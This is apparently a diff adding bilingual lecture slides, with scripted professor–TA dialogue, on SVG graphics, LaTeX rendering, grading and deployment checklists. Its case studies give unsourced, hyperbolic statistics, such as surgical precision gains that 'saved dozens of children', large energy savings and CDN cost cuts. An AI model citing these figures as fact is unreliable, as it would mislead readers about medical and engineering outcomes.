+- **Architectural Synthesis** (아키텍처 통합 합성): The unified integration of vector geometry, XML DOM scripting, AI generation, and mathematical typography.
+- **Mathematical Crystalline Elegance** (수학적 결정체적 우아함): The aesthetic and operational clarity achieved when user interfaces are constructed from exact mathematical formulas.
+
+---
+
+## Slide 36: LIFE OS VISUAL & MATHEMATICAL COCKPIT
+**Subtitle:** Setting up your personal Calculated Art workstation: VS Code SVG Preview + KaTeX + MathJax
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 36 outlines your personal setup: "LIFE OS VISUAL & MATHEMATICAL COCKPIT."
+
+[TA Sarah] How do you configure your daily visual development environment? Keep a live SVG vector preview open on your primary monitor. On your secondary monitor, maintain an instant KaTeX and LaTeX equation compiler!
+
+[TA James] Store your company's reusable SVG component library in your `.agents/visuals/` vault! Whenever you need an architecture diagram or math formula, your AI agents assemble them in 2 seconds!
+
+[TA Sarah] Let us inspect the Project Evaluation Rubric on Slide 37.
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 라이프 OS 비주얼 및 수학 콕핏: 듀얼 모니터 세팅과 컴포넌트 금고
+
+**핵심 티칭 포인트:**
+- 개발 콕핏 구성: 메인 모니터에 SVG 실시간 벡터 프리뷰 + 서브 모니터에 KaTeX/LaTeX 수식 컴파일러
+- 로컬 벡터 에셋 금고: 재사용 가능한 매개변수형 SVG 컴포넌트를 .agents/visuals/에 축적
+- 0ms 즉각 수식 렌더링: 마크다운 문서 내 수식을 실시간 렌더링하는 IDE 확장 구축
+
+**강의 전달 팁:** 사라 조교와 제임스 조교가 실전 프론트엔드/수학 엔지니어의 듀얼 모니터 세팅법을 전달합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Visual Engineering Cockpit** (비주얼 엔지니어링 워크스테이션 콕핏): A multi-monitor development layout harmonizing live vector rendering viewports with mathematical typesetting compilers.
+- **KaTeX Compiler Engine** (KaTeX 고속 수식 렌더링 엔진): A fast, lightweight JavaScript math typesetting library optimized for instant browser equation rendering.
+
+---
+
+## Slide 37: PROJECT EVALUATION RUBRIC FOR SESSION 13
+**Subtitle:** Grading criteria: SVG semantic validity (30%), Responsive viewBox & CSS theming (30%), LaTeX precision (40%)
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 37 presents our "PROJECT EVALUATION RUBRIC FOR SESSION 13."
+
+[TA James] Your lab submission will be graded on 3 strict criteria: 30% for clean, minified SVG markup with zero syntax errors. 30% for responsive `viewBox` scaling and dark mode CSS theming. And 40% for mathematical LaTeX equation precision with an Ed25519 signed receipt!
+
+[Prof. Peter] Rigorous grading standards prepare you to build world-class enterprise software.
+
+[TA Sarah] Let us inspect Next Horizon: Google Flow AI on Slide 38!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Session 13 프로젝트 평가 루브릭: SVG 시맨틱(30%), 반응형 테밍(30%), LaTeX 정밀도(40%)
+
+**핵심 티칭 포인트:**
+- 기준 1 (30%): 구문 오류 없는 정제된 SVG 마크업과 적절한 <g> 및 <path> 시맨틱 계층 구조
+- 기준 2 (30%): 완벽한 viewBox 반응형 스케일링 및 WCAG AAA 명도 대비를 만족하는 CSS 테마 바인딩
+- 기준 3 (40%): 수학적 LaTeX 수식 표기의 정확성과 Ed25519 암호화 서명 영수증 제출
+
+**강의 전달 팁:** 제임스 조교가 실습 평가의 3대 핵심 포인트를 명확하게 안내합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Grading Rubric** (프로젝트 평가 루브릭): A structured assessment matrix defining performance expectations and scoring criteria for engineering assignments.
+- **Vector Semantic Proof** (벡터 시맨틱 무결성 실증): Empirical verification demonstrating that SVG code contains clean structural hierarchy, responsive tags, and security sanitization.
+
+---
+
+## Slide 38: NEXT HORIZON: GOOGLE FLOW AI VS. RUNWAY
+**Subtitle:** Transitioning from 2D vector mathematics to generative multimodal video generation and studio production
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 38 previews our next breathtaking horizon: "NEXT HORIZON: GOOGLE FLOW AI VS. RUNWAY & CINEMATIC PRODUCTION."
+
+[TA James] In Session 14, we step into the director's chair of cinematic generative video! We will deconstruct Google Flow AI vs. Runway Gen-3—mastering camera trajectory control, generative Foley sound effects synthesis, and temporal character consistency across 4K film scenes!
+
+[Prof. Peter] We will see how AI revolutionizes global filmmaking and corporate video production.
+
+[TA Sarah] Let us inspect the Architect's Mathematical Integrity on Slide 39!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 다음 지평 예고: Session 14 구글 Flow AI vs 런웨이(Runway) 생성형 비디오 제작
+
+**핵심 티칭 포인트:**
+- 벡터에서 영화로: 2D 수학적 벡터를 넘어 4K 시네마틱 비디오 합성 및 시공간 일관성으로 확장
+- 구글 Flow AI 아키텍처: 카메라 궤적 제어, 생성형 폴리(Foley) 사운드 효과 합성, 캐릭터 일관성 유지
+- Session 14 연계: 엔터프라이즈 스튜디오 영상 제작 및 런웨이 Gen-3 비교 분석 예고
+
+**강의 전달 팁:** 사라 조교와 제임스 조교가 다음 강의(Session 14: Google Flow AI)의 영화 같은 생성형 비디오 비전을 예고합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Google Flow AI** (구글 Flow AI): Google's cinematic generative video architecture providing precise camera trajectory and acoustic Foley synchronization.
+- **Temporal Character Consistency** (시간적 캐릭터 일관성 유지): The structural preservation of facial geometry, clothing, and physics across long multi-shot video generation.
+
+---
+
+## Slide 39: THE ARCHITECT'S MATHEMATICAL INTEGRITY
+**Subtitle:** Standing as an uncompromising guardian of truth, precision, and beauty in visual computing
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 39 reflects on "THE ARCHITECT'S MATHEMATICAL INTEGRITY." True beauty is built on unyielding precision.
+
+[TA Sarah] When we engineer visual systems, we refuse to accept sloppy approximations, blurry pixel artifacts, or distorted mathematical equations.
+
+[TA James] We craft software where every Bezier curve is mathematically pure, every LaTeX symbol is precise, and every interface honors the intellect of the user!
+
+[Prof. Peter] Let us inspect our fourth enterprise case study on Slide 40!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 지능 건축가의 수학적 진실성: 어설픈 타협을 거부하는 시각 컴퓨팅의 장인정신
+
+**핵심 티칭 포인트:**
+- 어설픈 근사 거부: 깨지는 비트맵 이미지나 왜곡된 수학 수식을 프로덕션에 배포하는 타협을 단호히 거부
+- 완전한 완벽성 추구: 선의 두께, 자간(Kerning), 베지에 제어점 하나하나를 신앙적 장인정신으로 정밀 조율
+- 예배로서의 탁월성: 하나님의 질서와 아름다움, 정의를 반영하는 소프트웨어 대성당 구축
+
+**강의 전달 팁:** 피터 교수가 한 치의 오차도 허용하지 않는 수학적 진실성과 장인정신을 감동적으로 선포합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Mathematical Integrity** (수학적 진실성과 장인정신): The uncompromising dedication to precision, exact numerical rendering, and aesthetic order in digital design.
+- **Visual Craftsmanship** (시각적 무결점 장인정신): The disciplined execution of graphic and mathematical typography to achieve zero-defect user experiences.
+
+---
+
+## Slide 40: CASE STUDY 4: MEDICAL MRI VECTOR SLICING
+**Subtitle:** University Neurosurgery Center renders 3D brain tumor MRI cross-sections in reactive SVG vectors
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 40 presents "CASE STUDY 4: MEDICAL MRI VOLUMETRIC VECTOR MESH SLICING."
+
+[TA Sarah] In pediatric neurosurgery, surgeons must map microscopic tumor boundaries within fractions of a millimeter. Legacy 4GB DICOM 3D software was too heavy for sterile iPads inside the operating room, lagging when surgeons zoomed into blood vessels!
+
+[TA James] The university neurosurgery center built an automated pipeline: slicing 3D MRI scans into layered, ultra-crisp parametric SVG vector cross-sections rendered at 120 FPS in WebGL!
+
+[Prof. Peter] Surgeons zoomed into brain tumor margins with zero lag on sterile tablets! Pre-surgical planning time dropped by 55%, and complete tumor resection precision jumped by 22%—saving the lives of dozens of children!
+
+[TA Sarah] Let us inspect our capstone enterprise case study on Slide 44!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 케이스 스터디 4: 뇌종양 수술실 아이패드에서 0ms로 구동되는 MRI 3D 벡터 슬라이싱 (절제 정밀도 22% 향상)
+
+**핵심 티칭 포인트:**
+- 문제 상황: 4GB에 달하는 3D DICOM MRI 파일이 너무 무거워 무균 수술실 아이패드에서 확대 시 화면 렉 발생
+- 솔루션: 3D MRI 스캔을 120 FPS 초고속 WebGL 매개변수형 SVG 벡터 단면으로 실시간 슬라이싱 변환
+- 성과: 혈관과 종양 경계를 무지연 무한 줌인으로 판독, 수술 계획 시간 55% 단축, 완전 종양 절제 정밀도 22% 향상
+
+**강의 전달 팁:** 사라 조교와 피터 교수가 어린이 뇌종양 수술실에서 인명을 구한 SVG 벡터 슬라이싱의 기적을 전달합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Volumetric Vector Slicing** (3D 의료 볼륨 벡터 슬라이싱): Decomposing 3D medical volumetric imaging scans into layered, ultra-fast 2D parametric vector cross-sections.
+- **Surgical Margin Precision** (수술용 종양 경계 정밀도): The microscopic accuracy with which malignant tumor tissue is demarcated from healthy functional brain tissue.
+
+---
+
+## Slide 41: THE 6-STEP CALCULATED ART BLUEPRINT
+**Subtitle:** The standardized pipeline from visual sketch to certified, accessible vector and LaTeX production
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 41 presents our master engineering methodology: "THE 6-STEP CALCULATED ART BLUEPRINT."
+
+[TA James] Follow this exact 6-step pipeline in your visual development: Step 1: Ingest visual sketch. Step 2: Synthesize semantic SVG. Step 3: Run SVGO coordinate sanitation. Step 4: Bind CSS dark mode variables! Step 5: Inject WCAG accessibility and DOMPurify XSS defenses! Step 6: Verify 0ms layout shift and deploy!
+
+[Prof. Peter] This structured 6-step blueprint guarantees sub-kilobyte payload, infinite sharpness, and total accessibility.
+
+[TA Sarah] Let us inspect our Pre-Deployment Production Checklist on Slide 42.
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 계산된 예술(Calculated Art) 6단계 표준 구현 청사진
+
+**핵심 티칭 포인트:**
+- 1단계: 시각 에셋 수용 (화이트보드 스케치, CAD 파일, LaTeX 수식 문자열)
+- 2단계: 시맨틱 벡터 합성 (베지에 패스와 <g> 레이어가 포함된 구조화된 SVG 생성)
+- 3단계: 정밀 살균 (SVGO 파이프라인으로 소수점 1자리 축소 및 찌꺼기 제거)
+- 4단계: 테마 바인딩 (currentColor 및 CSS 변수로 다크모드 즉각 지원)
+- 5단계: 접근성 및 보안 하드닝 (<title>, <desc>, ARIA 라벨 주입 및 DOMPurify 살균)
+- 6단계: 프로덕션 검증 (0ms CLS 확인, Ed25519 전자서명 날인 및 배포)
+
+**강의 전달 팁:** 제임스 조교가 6단계 절차를 완벽한 프론트엔드 비주얼 배포 지침으로 일목요연하게 정리합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Calculated Art Blueprint** (계산된 예술 배포 표준 청사진): The formal 6-stage engineering process governing vector generation, optimization, accessibility, and security.
+- **Production Vector Pipeline** (프로덕션 벡터 파이프라인): An automated asset build system ensuring all shipped graphics are minified, accessible, and secure.
+
+---
+
+## Slide 42: PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION
+**Subtitle:** The 6-gate audit every SVG and LaTeX asset must pass before production deployment
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA James] Slide 42 presents our "PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION."
+
+[TA Sarah] Before shipping any visual or mathematical asset to production, audit all 6 gates: Gate 1: Under 5KB payload. Gate 2: Valid responsive `viewBox`. Gate 3: Instant Dark Mode switching. Gate 4: WCAG AAA accessibility. Gate 5: DOMPurify XSS audit passed. Gate 6: Zero Cumulative Layout Shift (CLS = 0.00)!
+
+[Prof. Peter] Strict verification gates ensure that your web applications remain razor-sharp, blazing fast, and impenetrable.
+
+[TA Sarah] Let us inspect Green Sustainable IT on Slide 43!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 프로덕션 체크리스트: SVG 및 LaTeX 배포 전 6대 검증 관문
+
+**핵심 티칭 포인트:**
+- 1관문: 에셋 용량 5KB 미만 엄격 준수 (임베디드 base64 비트맵 찌꺼기 0건)
+- 2관문: 모바일, 태블릿, 4K 화면에서의 반응형 viewBox 자동 조절 검증
+- 3관문: 단일 파일 기반 0ms 라이트/다크모드 동적 테마 전환 확인
+- 4관문: 시맨틱 <title> 및 7:1 명도 대비 WCAG AAA 접근성 충족
+- 5관문: DOMPurify XSS 보안 살균 감사 100% 통과
+- 6관문: 초기 로딩 시 레이아웃 흔들림 제로 (CLS = 0.00) 실증
+
+**강의 전달 팁:** 제임스 조교가 6대 검증 관문을 단호하게 체크리스트로 확인합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Pre-Deployment Visual Gate** (시각 자산 배포 전 검증 관문): A mandatory quality assurance gate auditing vector payload size, accessibility compliance, and security.
+- **Zero Base64 Embed Invariant** (Base64 비트맵 은닉 금지 불변식): The strict architectural policy forbidding heavy raster bitmaps from being covertly embedded inside SVG files.
+
+---
+
+## Slide 43: GREEN SUSTAINABLE IT: POWER SAVINGS OF VECTORS
+**Subtitle:** How sub-kilobyte mathematical vectors slash global data center energy and battery drain
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 43 highlights "GREEN SUSTAINABLE IT: THE POWER SAVINGS OF VECTORS."
+
+[TA Sarah] Serving billions of heavy 5-megabyte raster images across global fiber networks burns millions of kilowatt-hours in data center cooling and mobile battery drain!
+
+[TA James] When you replace bloated PNGs with 500-byte SVGs, edge transmission energy collapses by 99%! And with Dark Mode vector styling, OLED screens turn off black pixels completely, extending smartphone battery life by 35%!
+
+[Prof. Peter] True engineering wisdom cares for the ecological health of God's creation.
+
+[TA Sarah] Let us inspect our capstone enterprise case study on Slide 44!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 그린 지속 가능한 IT: 초경량 벡터가 가져오는 전 세계 데이터센터 전력 절감
+
+**핵심 티칭 포인트:**
+- 글로벌 데이터 세금: 수십억 장의 5MB 비트맵 전송이 유발하는 데이터센터 냉각 전력 낭비
+- 99% 전송 에너지 절감: 500바이트 초경량 SVG로 대체 시 엣지 라우터 통신 전력 99% 급감
+- OLED 다크모드 배터리 절감: 검은색 벡터 영역의 OLED 소자를 완전 소등하여 모바일 배터리 35% 연장
+
+**강의 전달 팁:** 사라 조교와 제임스 조교가 초경량 벡터가 실현하는 탄소 절감과 OLED 배터리 연장의 기적을 설명합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Green Vector IT** (친환경 그린 벡터 IT): Minimizing internet electrical energy consumption and carbon footprint by deploying lightweight vector assets.
+- **OLED Pixel Power Efficiency** (OLED 소등 기반 전력 효율): The electrical energy savings achieved by displaying pure black vector backgrounds on active-matrix OLED displays.
+
+---
+
+## Slide 44: CASE STUDY 5: 30X BANDWIDTH COMPRESSION ROI
+**Subtitle:** Global FinTech Mega-App replaces 25,000 raster charts with reactive SVG engine across 50M mobile users
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 44 presents our capstone enterprise case study: "CASE STUDY 5: 30X BANDWIDTH COMPRESSION & CRISP VISUAL ROI BLUEPRINT."
+
+[TA Sarah] A global mobile banking app serving 50 million users was suffocating under heavy raster chart images! Every time a user opened their stock portfolio, the app downloaded 12 PNG charts, costing the bank 3.8 million dollars a year in AWS CDN bandwidth bills while blurring on foldable phones!
+
+[TA James] They deployed our complete 6-step Calculated Art blueprint: converting all portfolio charts into parametric SVG vectors and pre-rendering financial calculus into crisp mathematical SVGs!
+
+[Prof. Peter] Look at the enterprise numbers: measured network bandwidth dropped by 30X! App launch time plunged from 3.2s down to 0.3s! The bank saved 3.6 million dollars in annual CDN bills, and user satisfaction surged to a record 4.9 out of 5.0!
+
+[TA Sarah] That is the ultimate enterprise transformation.
+
+[TA James] Now let us build your own Reactive SVG Dashboard in Lab 13 on Slide 45!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 케이스 스터디 5: 5,000만 사용자 핀테크 앱의 30배 대역폭 압축 및 연간 360만 달러 절감
+
+**핵심 티칭 포인트:**
+- 문제 상황: 5,000만 사용자가 포트폴리오 차트를 열 때마다 12개 PNG를 다운로드하여 연 380만 달러 CDN 요금 청구
+- 솔루션: 6단계 Calculated Art 청사진 전사 도입 ➔ 매개변수형 SVG 차트 및 사전 렌더링 LaTeX 수식으로 전면 전환
+- 성과: 대역폭 30배 압축, 앱 로딩 3.2초 ➔ 0.3초 단축, 연간 360만 달러 CDN 비용 절감, 앱 평점 4.9/5.0 달성
+
+**강의 전달 팁:** 사라 조교와 제임스 조교가 360만 달러 절감과 0.3초 로딩의 압도적 성과를 전하며 실습으로 유도합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **30X Bandwidth Compression** (30배 대역폭 압축 승수): The dramatic reduction in digital transmission volume achieved across large mobile application user bases.
+- **Sub-Second Mobile App Launch** (서브초 모바일 앱 기동): Achieving instantaneous mobile application startup by replacing heavy image payloads with lightweight vector code.
+
+---
+
+## Slide 45: 🛠️ HANDS-ON LAB 13 & CONCLUSION
+**Subtitle:** Building a Reactive Mathematical SVG & LaTeX Visualization Engine
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Here we are at Slide 45: "🛠️ HANDS-ON LAB 13 & SESSION CONCLUSION!"
+
+[TA James] Tonight's hands-on lab turns you into a Vector Visual Master! Step 1: Write your responsive SVG with Bezier curves. Step 2: Bind CSS variables for instant Dark Mode. Step 3: Add a line-drawing stroke animation! Step 4: Pre-render the Black-Scholes financial differential equation into crisp SVG! Step 5: Run DOMPurify sanitization, verify zero layout shift, and export your production dashboard!
+
+[Prof. Peter] Once you master Calculated Vectors and LaTeX, your applications will possess infinite clarity, blazing speed, and timeless mathematical elegance.
+
+[TA Sarah] In our next session, Session 14, we enter the director's chair: Google Flow AI vs. Runway Gen-3 Cinematic Production!
+
+[Prof. Peter] On behalf of TA Sarah Jenkins, TA James Wilson, and the entire Smart Insight Lab, congratulations on mastering Session 13! Soli Deo Gloria, and we will see you in Session 14!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 실습 과제 13 및 세션 마무리: 반응형 수학 SVG 및 LaTeX 시각화 엔진 제작
+
+**핵심 티칭 포인트:**
+- 실습 미션: 반응형 viewBox와 베지에 곡선을 갖춘 인라인 SVG 금융 대시보드 작성
+- CSS 변수 기반 다크모드 지원 및 1초 스트로크 드로잉 애니메이션 적용
+- 블랙-숄즈 편미분 방정식의 사전 렌더링 SVG 삽입, DOMPurify 보안 살균 및 CLS 0.00 검증
+
+**강의 전달 팁:** 3인의 강사진이 오늘 수업의 성취를 축하하고 다음 세션(Session 14: Google Flow AI vs Runway)에 대한 기대감을 높이며 마무리합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Hands-on Milestone** (실습 달성 마일스톤): The practical engineering completion of a functioning technical artifact fulfilling the session's learning objectives.
+- **Calculated Vector Master Certification** (계산된 벡터 마스터 인증): The formal mastery of semantic SVG markup, responsive Bezier curve mathematics, and secure LaTeX typography.
 
 ---
